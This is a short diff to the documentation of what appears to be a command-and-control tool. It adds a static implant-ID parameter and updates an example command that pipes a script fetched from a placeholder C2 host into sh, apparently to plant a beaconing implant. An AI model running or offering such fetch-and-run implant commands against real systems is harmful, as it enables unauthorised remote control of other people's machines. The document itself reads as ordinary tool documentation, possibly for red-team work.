@@ -156,10 +156,11 @@ Parameter | Example                     | Description
 ----------|-----------------------------|------------
 `c2url`   | `https://example.org:4342"` | Plonk's URL, less any path
 `cbint`   | `10m`                       | Beacon interval, rounded down to the nearest second
+`id`      | `kittens`                   | Static ImplantID
 
 Example:
 ```sh
-curl -sv https://c2domain.example.com/c?c2url=c2domain.example.com&cbint=1h | sh
+curl -sv https://c2domain.example.com/c?c2url=c2domain.example.com&cbint=1h&id=kittens | sh
 ```
 
 ### C2 URL
